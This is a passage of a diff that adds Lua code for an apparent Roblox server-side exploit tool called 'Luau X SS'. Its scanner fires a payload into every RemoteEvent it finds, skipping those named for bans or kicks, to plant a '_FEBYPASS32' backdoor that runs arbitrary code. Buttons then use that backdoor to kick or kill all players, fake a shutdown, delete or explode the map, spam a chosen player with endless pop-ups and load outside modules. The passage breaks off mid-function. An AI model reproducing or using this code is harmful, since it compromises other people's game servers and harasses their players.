+local ltw = TweenService:Create(l, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {    
+	Position = UDim2.new(0.80, 0, 0.792114913, 0)
+})                                                                                                                                                                                          local ltw2 = TweenService:Create(l, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {    
+	Position = UDim2.new(0.64, 0, 0.792114913, 0)
+})                                    
+local isVisible = false
+
+toggleButton.MouseButton1Click:Connect(function()
+if not isVisible then
+isVisible = true
+contentFrame.Visible = true
+contentFrame.Position = UDim2.new(-0.5, 0, 1.5, 0)
+
+local tweenIn = TweenService:Create(contentFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+Position = UDim2.new(0.55, 0, 0.5, 0)
+})
+tweenIn:Play()
+contentFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- Neo vào
+toggleButton.Text = "Close"
+else
+isVisible = false
+
+local tweenOut = TweenService:Create(contentFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {    
+	Position = UDim2.new(-0.5, 0, 1.5, 0)    
+})    
+tweenOut:Play()    
+
+tweenOut.Completed:Connect(function()    
+	contentFrame.Visible = false    
+end)    
+toggleButton.Text = "Show"
+
+end
+
+end)
+
+local frame2Visible = false
+
+button.MouseButton1Click:Connect(function()
+if not frame2Visible then
+frame2.Visible = true
+frame2.Size = UDim2.new(0, 0, 0, 0)
+frame2.Position = UDim2.new(0.5, 0, 0.4, 0)
+local growTween = TweenService:Create(frame2, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+Size = UDim2.new(0, 300, 0, 400)
+})
+growTween:Play()
+frame2Visible = true
+else
+local shrinkTween = TweenService:Create(frame2, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Size = UDim2.new(0, 0, 0, 0)
+})
+shrinkTween:Play()
+shrinkTween.Completed:Connect(function()
+frame2.Visible = false
+end)
+frame2Visible = false
+end
+end)
+local isFraExpanded = false
+
+l.MouseButton1Click:Connect(function()
+if not isFraExpanded then
+frame4.Visible = true
+local expandTween = TweenService:Create(frame4, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+Size = UDim2.new(0, 560, 0, 279)
+})
+best.ZIndex = 0                                                                                                                                                      expandTween:Play()                                                                                                                                                                         ltw:Play()
+l.Text = "Close"
+isFraExpanded = true
+else
+local shrinkTween = TweenService:Create(frame4, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Size = UDim2.new(0, 0, 0, 0)
+})
+shrinkTween:Play()
+shrinkTween.Completed:Connect(function()
+frame4.Visible = false
+end)
+best.ZIndex = 6                                                                                                                              ltw2:Play()                                                                                                                                                                              l.Text = "Open"
+isFraExpanded = false
+end
+end)
+local isFrame3Expanded = false
+
+best.MouseButton1Click:Connect(function()
+if not isFrame3Expanded then
+frame3.Visible = true
+local expandTween = TweenService:Create(frame3, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+Size = UDim2.new(0, 560, 0, 279)
+})
+expandTween:Play()                                   
+best.Text = "Close"
+isFrame3Expanded = true
+else
+local shrinkTween = TweenService:Create(frame3, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Size = UDim2.new(0, 0, 0, 0)
+})
+shrinkTween:Play()
+shrinkTween.Completed:Connect(function()
+frame3.Visible = false
+end)
+best.Text = "Open"
+isFrame3Expanded = false
+end
+end)                                                                                                                                                  --idk                                                                                                                                                                                                                                                                                                                                                                            --function execute
+function execute(s)
+if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+else
+warn("no backdoored")
+                                                                                                                                                      showNotification("hey " .. game.Players.LocalPlayer.Name .. " you forgot scanner or no backdoored")
+end
+end
+Clear.MouseButton1Click:Connect(function()
+Script.Text = ""
+end)
+
+wtf.MouseButton1Click:Connect(function()
+
+local function b_G_V12(see)
+local a = function(ree)
+ree:FireServer([[
+local folder = Instance.new('RemoteEvent')
+folder.Name = "_FEBYPASS32"
+folder.Parent = game:GetService("JointsService")
+local loadstring = require(13684410229)
+folder.OnServerEvent:Connect(function(_1,_2)
+loadstring(_2)()
+end)
+]]
+)
+end
+for i, v in pairs(see:GetChildren()) do
+if v:IsA("RemoteEvent") then
+if not string.match(string.lower(v.Name), "ban") then
+if not string.match(string.lower(v.Name), "kick") then
+a(v)
+end
+end
+end
+b_G_V12(v) --[[test]]
+end
+end
+local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+local timetoken = 0
+local maxtime = 1
+repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+                                                                                                    showNotification("backdoored found:) ")
+
+wtf.Text = "fd:)"
+
+execute("local h = Instance.new('Hint') h.Parent = Workspace h.Text = 'luau x v3 faster scanner| by gojohdkaisenkt' wait(30) h:Remove()")
+else
+wtf.Text = "scanning..."
+wait (2)
+showNotification("not found :( hey The game may be a backdoored fake game")                                                                                                                                                                     wtf.Text = "not fd :("
+end
+end)
+
+r6.MouseButton1Click:Connect(function()
+
+execute('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
+end)
+unfe.MouseButton1Click:Connect(function()
+if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(Script.Text) -- execute
+	else
+		warn("Failed to loadstring: Error 404")                                                                           showNotification("hey " .. game.Players.LocalPlayer.Name .. " you forgot scanner or no backdoored")                                                                                                     
+	end
+end)
+
+local buttonNames = {
+    "Skybox", "DecalSpam", "hint", "message",
+    "jumpscare", "kick others", "shutdown", "fire all",
+    "explode all", "kill all", "delete all", "Polaria",
+    "admin", "anti skids", "spawn noob", "spin all",
+    "BillboardGui spam", "theme", "bomber plane", "d#ck"
+}
+
+local buttonFunctions = {
+["Skybox"] = function()
+    execute("local l=game:GetService('Lighting') l:ClearAllChildren() local s=Instance.new('Sky') s.SkyboxBk='rbxassetid://103306305577320' s.SkyboxDn='rbxassetid://103306305577320' s.SkyboxFt='rbxassetid://103306305577320' s.SkyboxLf='rbxassetid://103306305577320' s.SkyboxRt='rbxassetid://103306305577320' s.SkyboxUp='rbxassetid://103306305577320' s.Parent=l")
+end,
+["DecalSpam"] = function()
+    execute("local function applyDecals(obj) for _,v in ipairs(obj:GetDescendants()) do if v:IsA('Decal') then v:Destroy() elseif v:IsA('BasePart') then v.Material='Plastic' v.Transparency=0 for _,face in ipairs(Enum.NormalId:GetEnumItems()) do local d=Instance.new('Decal') d.Texture='http://www.roblox.com/asset/?id=123694661930746' d.Face=face d.Parent=v end end end end applyDecals(workspace)")
+end,
+    ["hint"] = function()
+        execute("h=Instance.new('Hint') h.Parent=workspace h.Text='Luau X SS on top' wait(5) h:Destroy()")
+    end,
+    ["message"] = function()
+        execute("m=Instance.new('Message') m.Parent=workspace m.Text='Luau X SS active' wait(5) m:Destroy()")
+    end,
+ ["jumpscare"] = function()
+    execute("for _,p in pairs(game.Players:GetPlayers()) do local gui=Instance.new('ScreenGui') gui.Name='JumpScareGUI' gui.ResetOnSpawn=false gui.Parent=p:FindFirstChildOfClass('PlayerGui') local img=Instance.new('ImageLabel') img.Size=UDim2.new(1,0,1,0) img.Position=UDim2.new(0,0,0,0) img.BackgroundTransparency=1 img.Image='rbxassetid://103306305577320' img.ImageTransparency=1 img.Parent=gui local sound=Instance.new('Sound') sound.SoundId='rbxassetid://6129291390' sound.Volume=5 sound.Parent=gui sound:Play() game:GetService('TweenService'):Create(img,TweenInfo.new(0.2),{ImageTransparency=0}):Play() spawn(function() for j=1,100 do if img and img.Parent then img.Position=UDim2.new(0,math.random(-10,10),0,math.random(-10,10)) wait(0.01) end end img.Position=UDim2.new(0,0,0,0) end) delay(6,function() if img and img.Parent then game:GetService('TweenService'):Create(img,TweenInfo.new(0.3),{ImageTransparency=1}):Play() end wait(2) if gui and gui.Parent then gui:Destroy() end end) end")
+end,
+    ["kick others"] = function()
+    local N = game.Players.LocalPlayer.Name
+    execute("for _,p in pairs(game.Players:GetPlayers()) do if p.Name ~= '" .. N .. "' then p:Kick('Luau X SS') end end")
+end,
+    ["shutdown"] = function()
+        execute("for _,p in pairs(game.Players:GetPlayers()) do if p:FindFirstChildOfClass('PlayerGui') then local g=Instance.new('ScreenGui',p:FindFirstChildOfClass('PlayerGui')) g.Name='ShutdownGUI' g.ResetOnSpawn=false local f=Instance.new('Frame',g) f.Size=UDim2.new(1,0,1,0) f.BackgroundColor3=Color3.new(0,0,0) f.BackgroundTransparency=0.5 Instance.new('UICorner',f).CornerRadius=UDim.new(0,10) local i=Instance.new('ImageLabel',f) i.Size=UDim2.new(0,150,0,150) i.Position=UDim2.new(0.5,0,0.4,0) i.AnchorPoint=Vector2.new(0.5,0.5) i.BackgroundTransparency=1 i.Image='rbxassetid://123145425569096' Instance.new('UICorner',i).CornerRadius=UDim.new(1,0) local t=Instance.new('TextLabel',f) t.Size=UDim2.new(1,0,0,50) t.Position=UDim2.new(0,0,0.7,0) t.BackgroundTransparency=1 t.Text='' t.TextColor3=Color3.new(1,0,0) t.TextStrokeTransparency=0.5 t.TextScaled=true local s=Instance.new('Sound',g) s.SoundId='rbxassetid://9118823104' s.Volume=5 s:Play() local msg='Luau X is shutting down the server...' for i=1,#msg do t.Text=string.sub(msg,1,i) wait(0.05) end end end wait(2) for _,p in pairs(game.Players:GetPlayers()) do p:Kick('Luau X Shutdown') end") end,
+    ["fire all"] = function()
+        execute("for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then Instance.new('Fire',v) end end")
+    end,
+    ["explode all"] = function()
+        execute("for _,v in ipairs(workspace:GetDescendants()) do if v:IsA('BasePart') then e=Instance.new('Explosion') e.Position=v.Position e.BlastRadius=10 e.BlastPressure=500000 e.Parent=workspace end end")
+    end,
+    ["kill all"] = function()
+        execute("for _,p in pairs(game.Players:GetPlayers()) do if p~=game.Players.LocalPlayer and p.Character and p.Character:FindFirstChild('Humanoid') then p.Character.Humanoid.Health=0 end end")
+    end,
+    ["delete all"] = function()
+        execute("for _,v in ipairs(workspace:GetChildren()) do if v:IsA('Model') or v:IsA('Part') or v:IsA('UnionOperation') then v:Destroy() end end")
+    end,
+    ["Polaria"] = function()
+        execute('require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name .. '")')
+    end,
+    ["admin"] = function()
+execute("require(7192763922).load('"..game.Players.LocalPlayer.Name.."')")
+    end,
+    ["anti skids"] = function()
+        execute("require(10304477576).AntiSkid('"..game.Players.LocalPlayer.Name.."')")
+    end,
+["spawn noob"] = function()
+    execute("local Players = game:GetService('Players') local username = 'CinnabarMothMan' local success, userId = pcall(function() return Players:GetUserIdFromNameAsync(username) end) if not success then warn('Không tìm thấy người dùng:', username) return end local npc = Players:CreateHumanoidModelFromUserId(userId) npc.Name = 'Noob by gojohdkaisenkt' npc.Parent = workspace local hrp = npc:WaitForChild('HumanoidRootPart', 5) if not hrp then warn('Không tìm thấy HumanoidRootPart trong mô hình NPC.') return end local targetPlayer = Players:GetPlayers()[1] if not targetPlayer or not targetPlayer.Character then warn('Không tìm thấy player hoặc nhân vật.') return end local playerHRP = targetPlayer.Character:FindFirstChild('HumanoidRootPart') if not playerHRP then warn('Không tìm thấy HumanoidRootPart của player.') return end npc:SetPrimaryPartCFrame(playerHRP.CFrame * CFrame.new(0, 0, -5))")
+end,
+    ["spin all"] = function()                                                                                                                                                      execute("for _,plr in ipairs(game.Players:GetPlayers()) do if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then local gyro=Instance.new('BodyGyro') gyro.MaxTorque=Vector3.new(0,math.huge,0) gyro.P=10000 gyro.CFrame=plr.Character.HumanoidRootPart.CFrame gyro.Parent=plr.Character.HumanoidRootPart spawn(function() while gyro.Parent and plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid.Health>0 do gyro.CFrame=gyro.CFrame*CFrame.Angles(0,math.rad(10),0) wait(0.001) end end) end end")
+    end,
+    ["BillboardGui spam"] = function()
+execute("for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild('Head') then local gui1=Instance.new('BillboardGui') gui1.Parent = v.Character.Head gui1.Adornee = v.Character.Head gui1.Size = UDim2.new(2.5, 0, 2.5, 0) gui1.StudsOffset = Vector3.new(0, 0.2, 0) gui1.AlwaysOnTop = true local img = Instance.new('ImageLabel') img.Image = 'http://www.roblox.com/asset/?id=96074603352531' img.Size = UDim2.new(1, 0, 1, 0) img.Position = UDim2.new(0, 0, 0, 0) img.BackgroundTransparency = 1 img.Parent = gui1 v.Character.Head.Transparency = 1 end end")
+    end,
+    ["bomber plane"] = function()
+execute("local p=game.Players:GetPlayers()[1] if not p or not p.Character or not p.Character:FindFirstChild('HumanoidRootPart') then return end local root=p.Character.HumanoidRootPart local pos=root.Position local dir=root.CFrame.LookVector local plane=Instance.new('Part',workspace) plane.Size=Vector3.new(10,3,10) plane.Anchored=true plane.CanCollide=false plane.CFrame=CFrame.new(pos+Vector3.new(0,60,0)+dir*100,pos+Vector3.new(0,60,0)) plane.Name='BomberPlane' local mesh=Instance.new('SpecialMesh',plane) mesh.MeshType=Enum.MeshType.FileMesh mesh.MeshId='rbxassetid://14696124294' mesh.Scale=Vector3.new(2,2,2) spawn(function() for i=1,500 do plane.CFrame=plane.CFrame*CFrame.new(0,0,-2) wait(0.01) end plane:Destroy() end) for i=1,100 do local bomb=Instance.new('Part',workspace) bomb.Size=Vector3.new(2,2,2) bomb.Position=plane.Position-Vector3.new(0,2,0) bomb.Anchored=false bomb.CanCollide=true bomb.Name='Bomb' local m=Instance.new('SpecialMesh',bomb) m.MeshId='rbxassetid://15649100930' m.Scale=Vector3.new(1.5,1.5,1.5) local s=Instance.new('Sound',bomb) s.SoundId='rbxassetid://136749653197645' s.Volume=2 s:Play() local hint=Instance.new('Hint',workspace) hint.Text='luau X SS: bomber coming'game:GetService('Debris'):AddItem(hint,1.5) spawn(function() wait(2+math.random()) if bomb and bomb.Parent then local e=Instance.new('Explosion',workspace) e.Position=bomb.Position e.BlastRadius=10 e.BlastPressure=0 e.Parent=workspace for _,v in ipairs(workspace:GetDescendants()) do if v:IsA('BasePart') and (v.Position - bomb.Position).Magnitude < 15 then if v.Name~='Baseplate' then v.Anchored=false v.BrickColor=BrickColor.new('Really black') if not v:FindFirstChild('Fire') then local f=Instance.new('Fire',v) f.Heat=10 f.Size=6 end v.Touched:Connect(function(hit) local h=hit.Parent and hit.Parent:FindFirstChildOfClass('Humanoid') if h then h.Health=0 end end) end end end bomb:Destroy() end end) wait(0.2) end")
+    end,
+    ["theme"] = function()
+        execute("local s=Instance.new('Sound', workspace) s.Name='LuauXMusic' s.SoundId='rbxassetid://1839246711' s.Volume=999 s.Looped=true s:Play()")
+    end,                                                                                                                                                          ["d#ck"] = function()                                                                                                                   execute('require(140321069022189).pingas("' .. game.Players.LocalPlayer.Name .. '")')                                                                            end
+}
+
+local grid = Instance.new("UIGridLayout", scroll)
+grid.CellSize = UDim2.new(0.25, -10, 0, 50)
+grid.CellPadding = UDim2.new(0, 5, 0, 5)
+grid.SortOrder = Enum.SortOrder.LayoutOrder
+
+for _, name in ipairs(buttonNames) do
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Text = name
+    btn.Size = UDim2.new(0, 100, 0, 50)
+    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.TextScaled = true
+    btn.ZIndex = 4
+    btn.Parent = scroll
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+local func = buttonFunctions[name]
+if func then
+	btn.MouseButton1Click:Connect(func)
+else
+	btn.MouseButton1Click:Connect(function()
+		warn("Không có hàm cho nút: " .. name)
+	end)
+end                                                                                                                                                          end
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local scrollingFrame = Instance.new("ScrollingFrame")
+scrollingFrame.Size = UDim2.new(0, 560, 0, 279)
+scrollingFrame.Position = UDim2.new(0, 0.5, 0, 0.5)
+scrollingFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+scrollingFrame.BackgroundTransparency = 1
+scrollingFrame.ScrollBarThickness = 8
+scrollingFrame.CanvasSize = UDim2.new(0, 0, 2, 0)
+scrollingFrame.ZIndex = 5
+scrollingFrame.Parent = frame4
+
+local frame0 = Instance.new("Frame", scrollingFrame)
+frame0.AnchorPoint = Vector2.new(0, 0)
+frame0.Position = UDim2.new(0, 0, 0, 0)
+frame0.Size = UDim2.new(0, 230, 0, 150)
+frame0.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame0.BorderSizePixel = 0
+frame0.ZIndex = 4
+frame0.AutomaticSize = Enum.AutomaticSize.None
+Instance.new("UICorner", frame0).CornerRadius = UDim.new(0, 10)
+
+local scroll10 = Instance.new("ScrollingFrame", frame0)
+scroll10.Size = UDim2.new(1, -10, 1, -10)
+scroll10.Position = UDim2.new(0, 5, 0, 5)
+scroll10.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll10.ScrollBarThickness = 4
+scroll10.BackgroundTransparency = 1
+scroll10.ZIndex = 5
+
+local layout0 = Instance.new("UIListLayout", scroll10)
+layout0.SortOrder = Enum.SortOrder.LayoutOrder
+layout0.Padding = UDim.new(0, 6)
+
+local selectedButton = nil
+
+local function createPlayerButton(plr)
+	local button0 = Instance.new("TextButton")
+	button0.Size = UDim2.new(1, 0, 0, 35)
+	button0.Text = (plr.Name == "gojohdkaisenkt") and (plr.Name .. "  [owner]👑") or plr.Name
+	button0.Font = Enum.Font.GothamBold
+	button0.TextScaled = false
+	button0.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+	button0.TextColor3 = Color3.new(1, 1, 1)
+	button0.ZIndex = 5
+	button0.Name = plr.Name
+	button0.Parent = scroll10
+Instance.new("UICorner", button0).CornerRadius = UDim.new(0, 10)
+	local success, thumb = pcall(function()
+		return Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+	end)
+	if success and thumb then
+		local img = Instance.new("ImageLabel", button0)
+		img.Image = thumb
+		img.Size = UDim2.new(0, 32, 0, 32)
+		img.Position = UDim2.new(0, 5, 0.5, -16)
+		img.BackgroundTransparency = 1
+		img.ZIndex = 6                                                                                                                                                                        Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
+	end
+	local stroke0 = Instance.new("UIStroke", button0)
+	stroke0.Color = Color3.fromRGB(0, 255, 100)
+	stroke0.Thickness = 2
+	stroke0.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	stroke0.Transparency = 0
+	stroke0.Enabled = false
+
+button0.MouseButton1Click:Connect(function()
+	local playerName = button0.Name -- chính xác tên gốc
+	local plr = Players:FindFirstChild(playerName)
+
+	if plr and plr.Name == "gojohdkaisenkt" then
+		showNotification("u can't select me I'm the owner-_-")
+		return
+	end
+
+	if selectedButton and selectedButton ~= button0 then
+		local prevStroke = selectedButton:FindFirstChildOfClass("UIStroke")
+		if prevStroke then
+			prevStroke.Enabled = false
+		end
+	end
+
+	if selectedButton == button0 then
+		stroke0.Enabled = not stroke0.Enabled
+		if not stroke0.Enabled then
+			selectedButton = nil
+		end
+	else
+		stroke0.Enabled = true
+		selectedButton = button0
+	end
+
+	if plr then
+		print("Đã chọn player:", plr.Name)
+	else
+		warn("Không tìm thấy player:", playerName)
+	end
+end)                                                                                                                                              end
+for _, plr in ipairs(Players:GetPlayers()) do
+	createPlayerButton(plr)
+end
+
+layout0:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+	scroll10.CanvasSize = UDim2.new(0, 0, 0, layout0.AbsoluteContentSize.Y)
+end)
+
+Players.PlayerAdded:Connect(createPlayerButton)
+Players.PlayerRemoving:Connect(function(plr)
+	local btn = scroll10:FindFirstChild(plr.Name)
+	if btn then
+		btn:Destroy()
+	end
+end)
+local fpsLabel = Instance.new("TextLabel", contentFrame)
+fpsLabel.Size = UDim2.new(1, -10, 0, 30)
+fpsLabel.Position = UDim2.new(0.80, 0, 0, 0)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.Font = Enum.Font.GothamBold
+fpsLabel.TextSize = 18
+fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.Text = "FPS: Loading..."
+
+local pingLabel = Instance.new("TextLabel", contentFrame)
+pingLabel.Size = UDim2.new(1, -10, 0, 30)
+pingLabel.Position = UDim2.new(0.62, 0, 0, 0)
+pingLabel.BackgroundTransparency = 1
+pingLabel.Font = Enum.Font.GothamBold
+pingLabel.TextSize = 18
+pingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+pingLabel.TextXAlignment = Enum.TextXAlignment.Left
+pingLabel.Text = "Ping: Loading..."
+
+local fps = 0
+local lastUpdate = time()
+RunService.RenderStepped:Connect(function()
+	fps += 1
+	local now = time()
+	if now - lastUpdate >= 1 then
+		fpsLabel.Text = "FPS: " .. tostring(fps)
+		fps = 0
+		lastUpdate = now
+
+		local ping = math.floor(Players.LocalPlayer:GetNetworkPing() * 1000)
+		pingLabel.Text = "Ping: " .. ping .. " ms"
+	end
+end)
+
+local mainFrame = Instance.new("Frame", scrollingFrame)
+mainFrame.Size = UDim2.new(0, 300, 0, 200)
+mainFrame.Position = UDim2.new(0.4, 0, 0, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 5
+mainFrame.BackgroundTransparency = 1
+
+local label = Instance.new("TextLabel", mainFrame)
+label.Text = "Text:"
+label.Size = UDim2.new(0, 50, 0, 30)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.TextColor3 = Color3.fromRGB(255, 80, 80)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.GothamBold
+label.TextScaled = true
+label.ZIndex = 5
+
+local inputBox = Instance.new("TextBox", mainFrame)
+inputBox.PlaceholderText = "Reason/Name"
+inputBox.Size = UDim2.new(0, 220, 0, 30)
+inputBox.Position = UDim2.new(0, 70, 0, 10)
+inputBox.Text = ""
+inputBox.TextColor3 = Color3.new(1, 1, 1)
+inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+inputBox.Font = Enum.Font.Gotham
+inputBox.TextScaled = true
+inputBox.BorderSizePixel = 0
+inputBox.ZIndex = 5
+
+local function createButton(text, posX, posY, onClick)
+	local btn = Instance.new("TextButton", mainFrame)
+	btn.Size = UDim2.new(0, 120, 0, 35)
+	btn.Position = UDim2.new(0, posX, 0, posY)
+	btn.Text = text
+	btn.Font = Enum.Font.GothamBold
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.TextScaled = true
+	btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	btn.BorderSizePixel = 0
+	btn.ZIndex = 5
+
+	if typeof(onClick) == "function" then
+		btn.MouseButton1Click:Connect(onClick)
+	end
+
+	return btn
+end
+
+createButton("Kick", 10, 50).MouseButton1Click:Connect(function()
+	if not selectedButton then
+		showNotification("u forgot selecte player")
+		return
+	end
+
+	local playerName = selectedButton.Text -- Lấy từ button0.Text
+	local reason = inputBox.Text ~= "" and inputBox.Text or "No reason provided."
+
+	execute("for _,plr in pairs(game:GetService('Players'):GetPlayers()) do if plr.Name=='" .. playerName .. "' then plr:Kick('Kicked by Admin | Reason: " .. reason .. "') end end")
+end)
+
+createButton("refresh", 160, 50, function()
+if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute("for _,plr in pairs(game:GetService('Players'):GetPlayers()) do " ..
+"if plr.Name=='" .. playerName .. "' then " ..
+"local hrp = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') " ..
+"local pos = hrp and hrp.CFrame " ..
+"plr:LoadCharacter() " ..
+"if pos then plr.Character:WaitForChild('HumanoidRootPart').CFrame = pos end " ..
+"end end") end)
+createButton("name", 10, 100, function()
+if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+local text0 = inputBox.Text ~= "" and inputBox.Text or "VIVA LA LUAU X SS"
+
+execute('local p=game.Players:FindFirstChild("'..playerName..'")if p and p.Character and p.Character:FindFirstChild("Head")then local bb=Instance.new("BillboardGui");bb.Name="FakeBubble";bb.Size=UDim2.new(0,200,0,50);bb.StudsOffset=Vector3.new(0,3,0);bb.Adornee=p.Character.Head;bb.AlwaysOnTop=true;bb.Parent=p.Character.Head;local l=Instance.new("TextLabel",bb);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.TextScaled=true;l.Text="'..text0..'";l.Font=Enum.Font.SourceSansBold;l.TextColor3=Color3.new(1,1,1);l.TextStrokeTransparency=0.5;local grad=Instance.new("UIGradient",l);grad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,255))});local UIS=Instance.new("UIScale",bb);UIS.Scale=0;local ts=game:GetService("TweenService");ts:Create(UIS,TweenInfo.new(0.25,Enum.EasingStyle.Elastic,Enum.EasingDirection.Out),{Scale=1}):Play();game:GetService("Debris"):AddItem(bb,999999999)end')
+end)
+createButton("Bring", 160, 100, function()
+	if not selectedButton then
+showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+local callerName = game.Players.LocalPlayer.Name
+
+execute('local p1=game.Players:FindFirstChild("'..playerName..'")local p2=game.Players:FindFirstChild("'..callerName..'")if p1 and p2 and p1.Character and p2.Character then local r1=p1.Character:FindFirstChild("HumanoidRootPart")local r2=p2.Character:FindFirstChild("HumanoidRootPart")if r1 and r2 then r1.CFrame=r2.CFrame+Vector3.new(3,0,0)end end')
+end)                                                                                                                                                       
+
+local fr = Instance.new("Frame", scrollingFrame)
+fr.Name = "MainFrame"
+fr.Size = UDim2.new(0, 600, 0, 200)
+fr.Position = UDim2.new(0, 0, 0.5, -125)
+fr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+fr.BorderSizePixel = 0
+
+local title = Instance.new("TextLabel", fr)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+title.Text = "others"
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.BorderSizePixel = 0
+local scrollo = Instance.new("ScrollingFrame", fr)
+scrollo.Position = UDim2.new(0, 0, 0, 30)
+scrollo.Size = UDim2.new(1, 0, 1, -30)
+scrollo.BackgroundTransparency = 1
+scrollo.ScrollBarThickness = 6
+scrollo.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local layouto = Instance.new("UIGridLayout", scrollo)
+layouto.CellSize = UDim2.new(0.31, -5, 0, 35)
+layouto.CellPadding = UDim2.new(0, 5, 0, 5)
+layouto.SortOrder = Enum.SortOrder.LayoutOrder
+
+local buttonNames = {
+	"-10size", "x10size", "pop up",
+	"f3x", "char gojohdkaisenkt", "delete",
+	"fezee", "soon", "soon",
+	"soon", "soon"
+}
+
+local buttonFunctions = {
+	["-10size"] = function()
+		if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('local p=game.Players:FindFirstChild("'..playerName..'") if p and p.Character then if not p.Character.PrimaryPart then p.Character.PrimaryPart = p.Character:FindFirstChild("HumanoidRootPart") end if p.Character.PrimaryPart then p.Character:ScaleTo(0.1) end end')
+	end,
+
+	["x10size"] = function()
+			if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('local p=game.Players:FindFirstChild("'..playerName..'") if p and p.Character then if not p.Character.PrimaryPart then p.Character.PrimaryPart = p.Character:FindFirstChild("HumanoidRootPart") end if p.Character.PrimaryPart then p.Character:ScaleTo(10) end end')
+	end,
+
+	["pop up"] = function()
+if not selectedButton then
+showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('local plr=game.Players:FindFirstChild("'..playerName..'") if plr then spawn(function() for i=1,103306305577320 do local gui=Instance.new("ScreenGui",plr:WaitForChild("PlayerGui")) gui.ResetOnSpawn=false local img=Instance.new("ImageLabel",gui) img.Size=UDim2.new(0,100,0,100) img.Position=UDim2.new(math.random(),0,math.random(),0) img.BackgroundTransparency=1 img.Image="rbxassetid://103306305577320" wait(0.1) end end) end')
+	end,
+
+	["f3x"] = function()
+		if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('require(4869378421).F3X("'..playerName..'")')
+	end,
+
+	["char gojohdkaisenkt"] = function()
+if not selectedButton then
+	showNotification("Bạn chưa chọn người chơi!")
+	return
+end
+
+local playerName = selectedButton.Text
+local skinUsername = "gojohdkaisenkt"
+
